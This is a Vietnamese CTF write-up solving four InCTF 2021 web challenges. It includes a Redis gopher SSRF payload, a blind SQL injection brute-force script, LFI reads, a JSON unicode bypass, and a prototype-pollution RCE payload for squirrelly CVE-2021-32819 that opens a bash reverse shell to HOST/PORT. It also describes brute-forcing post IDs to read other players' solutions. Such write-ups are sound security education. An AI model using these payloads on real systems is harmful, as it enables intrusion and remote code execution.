---
layout: post
title: "WRITEUP INCTF 2021: WEB"
categories: CTF
toc: true
---

Lâu rồi mình cũng không viết writeup, hôm nay có giải inctf 2021 rating 70 với mình thấy challenge cũng hay nên mình viết lại một số bài mà mình giải quyết được.
Source code và payload của các bài mình giải được mình bỏ ở đây nhé.
[SOURCE](https://github.com/DauHoangTai/CTF/tree/master/2021/inctf)

## Challenge MD Notes
Bài này là một bài xss và được viết bằng golang. Mình sẽ tập trung vào file `server.go`.
Cụ thể ở function `createHandler`.
![image](https://user-images.githubusercontent.com/54855855/129487635-775f2a92-1c36-4dd3-9d7a-59c7fad1704d.png)
Mỗi bài mà chúng ta tạo đều có hash riêng và nếu như hash đó bằng với hash_admin thì không có `sanitize`.

Function `sanitize`
![image](https://user-images.githubusercontent.com/54855855/129487683-2a439e10-b9f3-4287-aa61-106caa71181b.png)

Ở func này chỉ có chức năng là EscapeString (htmlencode) chống mình xss.
=> Mình chỉ cần tìm ra `admin_hash` thì có thể nhảy qua được `sanitize` và xss bình thường.

Sau một hồi stuck vì không biết kiếm cách nào để lấy được `admin_hash` thì đọc func `save_post`
![image](https://user-images.githubusercontent.com/54855855/129487765-da2dc35b-91c9-47f3-90fa-77e21eaf3d67.png)
postid được gen bằng `((CONFIG.seed * CONFIG.a) + CONFIG.c) % CONFIG.modulus`
Có thêm 1 api là `_debug`. Access nó thì ta lấy được `{"Admin_bucket":"b5cd7ae0-7b50-7ae0-7ae0-47a03b473015","VAL_A":245,"VAL_B":143}`.
```golang
CONFIG = Config{
		admin_bucket: os.Getenv("ADMIN_BUCKET"),
		admin_token: os.Getenv("FLAG"),
		secret: os.Getenv("SECRET"),
		admin_hash: getadminhash(), 
		modulus: 99999999999,
		seed: rand.Intn(9e15) + 1e15, 
		a: a, 
		c: c,
	}
```
Từ những data này thì ra có thể brute ra postid và dựa vô đó đọc solution của người khác =)) hay còn gọi là chôm flag và đây cũng là unintended của bài này.

### Payload
```py
from Crypto.Util.number import *
import requests
modul=99999999999
a=245
c=143
post_id=90462233978
for i in range(10000):
    tmp=post_id-c
    seed=tmp*inverse(a,modul)%modul
    print(seed)
    post_id=seed
    url="http://web.challenge.bi0s.in:5432/b5cd7ae0-7b50-7ae0-7ae0-47a03b473015" #admin_bucket
    r=requests.get(url+f"/{post_id}")
    if "not found" not in r.text: #and "name" not in r.text and "<script>fetch(" not in r.text
        print(r.text)
        break

```
Và sau đó mình thấy được 1 solution có chứa web-hook và mình nhảy vô và đọc được flag.

Flag -> `inctf{8d739_csrf_is_fun_3d587ec9}`

### Intended
Solution chính thức ở đây như mình đã nói là kiếm `admin_hash`, sau đó xss bình thường.
```golang
func getadminhash() string {
	token := CONFIG.admin_token
	h := sha256.New()
    h.Write([]byte(token + CONFIG.secret))
    sha256_hash := hex.EncodeToString(h.Sum(nil))
	log.Println("Generated admin's hash ", sha256_hash)
    return string(sha256_hash)
}
```
```golang
CONFIG = Config{
		admin_bucket: os.Getenv("ADMIN_BUCKET"),
		admin_token: os.Getenv("FLAG"),
		secret: os.Getenv("SECRET"),
		admin_hash: getadminhash(), 
		modulus: 99999999999,
		seed: rand.Intn(9e15) + 1e15, 
		a: a, 
		c: c,
	}
```
Func này tạo admin_hash nhưng khi gọi `getadminhash()` trong khi CONFIG chưa khởi tạo xong => admin_hash blank.
Đây là script của author, mọi người có thể tham khảo.
[Link script](https://gist.github.com/yadhukrishnam/83ba65195ace0f1d526091e248638caf)

Payload solved bot
```py
import hashlib

def solve_capcha(capcha):
    i = 0
    while True:
        value = str(i).encode()

        if hashlib.sha256(value).hexdigest()[:5] == val:
            print(value)
            return value
        i += 1
solve_capcha('de52')
```

## Challenge Raas
Được cung cấp một Dockerfile thì chúng ta đọc nó thôi hehe
```
ADD flask-server /code
WORKDIR /code
RUN pip install -r requirements.txt
CMD ["python", "app.py"]
```
Thấy được có nơi lưu code để deploy là `/code`
Ở ô input thì chúng ta phải nhập một url. Ở đây mình thử nhập 1 protocol là `file://` với hi vọng tải được file source về.
Lần 1: `file:///code/app.py` -> tải được file app.py
Ở trong phần import thư viện thì mình thấy `from main import Requests_On_Steroids`, vậy nên thử tải luôn main.py
Lần 2: `file:///code/main.py` -> tải được file main.py

File `app.py`
Đầu tiên ta thấy server sử dụng `redis`.
```py
if not request.cookies.get('userID'):
    user=Upper_Lower_string(32)
    r.mset({str(user+"_isAdmin"):"false"})
    resp.set_cookie('userID', user)
else:
    user=request.cookies.get('userID')
    flag=r.get(str(user+"_isAdmin"))
    if flag == b"yes":
        resp.set_cookie('flag',str(os.environ['FLAG']))
    else:
        resp.set_cookie('flag', "NAAAN")
return resp
```
Ở đoạn code này nếu như `user_isAdmin = yes` thì mình flag sẽ được set cho cookie có name là `flag`, mặc định sẽ là `user_isAdmin = false` và cookie flag được đặt là `NAAAN`.

File `main.py`
```py
def Requests_On_Steroids(url):
    try:
        s = requests.Session()
        s.mount("inctf:", GopherAdapter())
        s.mount('file://', LocalFileAdapter())
        resp = s.get(url)
        assert resp.status_code == 200
        return(resp.text)
    except:
        return "SOME ISSUE OCCURED"
```
Ở file này nó mount schema vậy mình chỉ cần gopher vô redis set uid của mình là isAdmin = yes là có flag (SSRF)

### Payload
`inctf://redis:6379/_set taidh_isAdmin yes`
Sau đó truy cập lại với cookie uid=taidh sẽ có flag trả về ở cookie

Flag -> `inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}`

## Challenge Vuln Drive
Đăng nhập với account bất kì sau đó thấy có chức năng upload và download file về.
F12 thì thấy được có `/source` => được cung cấp source. hehe
`/return-files` có thể LFI và từ đó chúng ta có thể đọc các file.
```py
def return_files_tut():
    if auth():
        return redirect('/logout')
    filename=request.args.get("f")
    if(filename==None):
        return "No filenames provided"
    print(filename)
    if '..' in filename:
        return "No hack"
    file_path = os.path.join(app.config['UPLOAD_FOLDER'],str(session['uid']),filename)
    if(not os.path.isfile(file_path)):
        return "No such file exists"
    return send_file(file_path, as_attachment=True, attachment_filename=filename)
```
Nó chỉ check nếu trong tham số `f` nếu có `..` hay không.

`/dev_test` nhận url mà ta cung cấp và có function `url_validate` để check url đó.
```py
def url_validate(url):
    blacklist = ["::1", "::"]
    for i in blacklist:
        if(i in url):
            return "NO hacking this time ({- _ -})"
    y = urlparse(url)
    hostname = y.hostname
    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = ""
    print(url, hostname,ip)
    ips = ip.split('.')
    if ips[0] in ['127', '0']:
        return "NO hacking this time ({- _ -})"
    else:
        try:
            url = unquote(url)
            r = requests.get(url,allow_redirects = False)
            return r.text
        except:
            print(url, hostname)
            return "cannot get you url :)"
```
Để bypass những cái trên thì mình đã urlencode đầu vào. Vì sau khi check hết tất cả các blacklist thì nó sẽ `unquote` (decode) và truy cập vào url.

Access `http://127%2E0%2E0%2E1` ở `dev_test` thì nhận được mã nguồn php.
```php
<?php
include('./conf.php');
$inp=$_GET['part1'];
$real_inp=$_GET['part2'];
if(preg_match('/[a-zA-Z]|\\\|\'|\"/i', $inp)) exit("Correct <!-- Not really -->");
if(preg_match('/\(|\)|\*|\\\|\/|\'|\;|\"|\-|\#/i', $real_inp)) exit("Are you me");
$inp=urldecode($inp);
//$query1=select name,path from adminfo;
$query2="SELECT * FROM accounts where id=1 and password='".$inp."'";
$query3="SELECT ".$real_inp.",name FROM accounts where name='tester'";
$check=mysqli_query($con,$query2);
if(!$_GET['part1'] && !$_GET['part2'])
{
    highlight_file(__file__);
    die();
}
if($check || !(strlen($_GET['part2'])<124))
{
    echo $query2."<br>";
    echo "Not this way<br>";
}
else
{
    $result=mysqli_query($con,$query3);
    $row=mysqli_fetch_assoc($result);
    if($row['name']==="tester")
        echo "Success";
    else
        echo "Not";
    //$err=mysqli_error($con);
    //echo $err;
}
?>
```
Ở file này thì có 2 tham số là `part1` và `part2`.
```php
$inp=$_GET['part1'];
$real_inp=$_GET['part2'];
```
Để thực hiện được `query3` thì chúng ta cần vượt qua `if($check || !(strlen($_GET['part2'])<124))`
```php
$query2="SELECT * FROM accounts where id=1 and password='".$inp."'";
$query3="SELECT ".$real_inp.",name FROM accounts where name='tester'";
```
Chỉ cần câu `query2` -> lỗi và len của `part2` < 124.

Để câu `query2` lỗi thì chúng ta chỉ cần thêm `'`. Nhưng preg_match đã filter. Chú ý kĩ hơn thì thấy sau khi check qua preg_match thì sẽ `$inp=urldecode($inp);` decode. vậy chúng ta chỉ cần encode `'` => vượt qua được preg_match và vừa làm câu `query2` lỗi.
Điều kiện còn lại thì chỉ cần len của `part2` < 124 là xong.

Sau khi một hồi tìm thì không thấy flag ở trong db và phải inbox author hỏi. Anh ấy bảo chỉ cần tìm path flag ở trong db. Tới đây mình nghĩ vậy ở trong db có path flag sau đó chỉ cần sử dụng LFI để đọc.

Chú ý ở câu `query1` được comment
```php
//$query1=select name,path from adminfo;
```
Chúng ta có table `adminfo` và có 2 cột name và path. Có lẽ brute path ở đây.

### Payload
Mình đã sử dụng LFI để đọc file `/etc/hosts` và nhận được host local là `192.168.48.2` và mình sử dụng nó luôn hehe
```py
import requests
import string

url="http://web.challenge.bi0s.in:6006/login"
url1="http://web.challenge.bi0s.in:6006/dev_test"

def login():
  r = requests.post(url,data={'username':'admin','password':'1337'}, allow_redirects = False)
  newcookie= r.cookies['session']
  return newcookie

i=0
flag = ''
newcookie=login()

while True:
  i = i+1
  for char in '/'+string.ascii_letters+string.digits+'-.':
    print(flag+char,end='\r')
    data = {'url':f"http://192.168.48.2?part1=%252527&part2=1,name from adminfo where name like 0x{(flag+char).encode('utf-8').hex()}25 Union select 1"}
    r = requests.post(url=url1,data=data,cookies={"session":newcookie})
    print(r.text)
    if 'Not' in r.text:
      flag += char
      print(flag)
      break
```
Sau đó sử dụng path flag và brute được vào chỗ. `/return-file?f=/path_flag`.

Flag -> `inctf{y0u_pr0v3d_th4t_1t_i5_n0t_53cur3_7765626861636b6572}`

## Challenge Json Analyser
Ở bài này được cung cấp all source. Server sẽ kill trong 10 phút, nên mình tự deploy local để test.
Đầu tiên, sẽ có phần upload file, nhưng để upload được thì cần phải có pin code. Ở `/waf` có vẻ như là sẽ tạo pincode.

Đọc code thôi hehe. file `/waf/waf.py`
```py
@app.route('/verify_roles',methods=['GET','POST'])
def verify_roles():
    no_hecking=None
    role=request.args.get('role')
    if "superuser" in role:
        role=role.replace("superuser",'')
    if " " in role:
        return "n0 H3ck1ng"
    if len(role)>30:
        return "invalid role"
    data='"name":"user","role":"{0}"'.format(role)
    no_hecking=re.search(r'"role":"(.*?)"',data).group(1)
    if(no_hecking)==None:
        return "bad data :("
    if no_hecking == "superuser":
        return "n0 H3ck1ng"
    data='{'+data+'}'
    try:
        user_data=ujson.loads(data)
    except:
        return "bad format" 
    role=user_data['role']
    user=user_data['name']
    if (user == "admin" and role == "superuser"):
        return os.getenv('subscription_code')
    else:
        return "no subscription for you"
```
Nhận tham số `role` và sẽ được check một số thứ như. Nếu có `superuser` sẽ replace thành blank. len của role không được > 30.
Để nhận được pincode thì cần `user == admin` và `role == superuser`.
```py
data='"name":"user","role":"{0}"'.format(role)
```
data mặc định sẽ là `name=user` và role là thứ mình truyền vào. Nhìn vào thì mình có thể escape ở role này và thêm `name`.
```py
data='{'+data+'}'
    try:
        user_data=ujson.loads(data)
    except:
        return "bad format" 
    role=user_data['role']
    user=user_data['name']
```
Sau khi thêm vào thì data sẽ được biến thành cấu trúc json và sử dụng `ujson.load(data)` để load dữ liệu.
Vì mình gặp json khá nhiều nên sau khi đọc tới đoạn `ujson.loads(data)` thì mình nhớ đến bài viết này
[Document JSON](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities)
=> sử dụng unicode thể bypass các thứ trên để tạo `role=superuser` và add thêm `name=admin`.

Tiếp tục qua file `app.js`.
```js
 if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).send('No files were uploaded.');
    }
    uploadFile = req.files.uploadFile;
    uploadPath = __dirname + '/package.json' ;
    uploadFile.mv(uploadPath, function(err) {
        if (err)
            return res.status(500).send(err);
        try{
            var config = require('config-handler')();
        }
        catch(e){
            const src = "package1.json";
            const dest = "package.json";
            fs.copyFile(src, dest, (error) => {
                if (error) {
                    console.error(error);
                    return;
                }
                console.log("Copied Successfully!");
            });
            return res.sendFile(__dirname+'/static/error.html')
        }
```
Ở đây chỉ có chức năng tải lên 1 file `.json` sau đó được copy vào tệp `package.json` và cuối cùng được load bằng `var config = require('config-handler')();`.

Đầu tiên thì thấy được `config-handler` có thể tấn công `Prototype_Pollution`.

Ngồi đọc code một hồi thì không thấy có gì lạ và exploit chỗ nào. Bỗng dưng thấy thư viện `squirrelly` này khá lạ và bắt đầu tìm hiểu về nó và thấy được có một CVE gần đây và cùng version và server đang sử dụng.
[CVE-2021-32819](https://blog.diefunction.io/vulnerabilities/ghsl-2021-023)
Để hiểu hơn thì bạn có thể đọc bài phân tích về CVE đó nhá.

Ở đây mình lấy luôn payload của họ và sửa lại và thêm prototype pollution để exploit.

### Payload
payload genpin -> `super\u0075ser","name":"admin`

file upload reverse shell
```json
{"dependencies":{"__proto__":{"defaultFilter": "e'));var require=global.require || global.process.mainModule.constructor._load; require('child_process').exec('/bin/bash -c \"/bin/bash -i >& /dev/tcp/HOST/PORT 0>&1\"');//"}}}
```
Nhớ thay HOST và PORT của các bạn nhé.

Flag -> `inctf{Pr0707yp3_P011u710n5_4r3_D34dly}`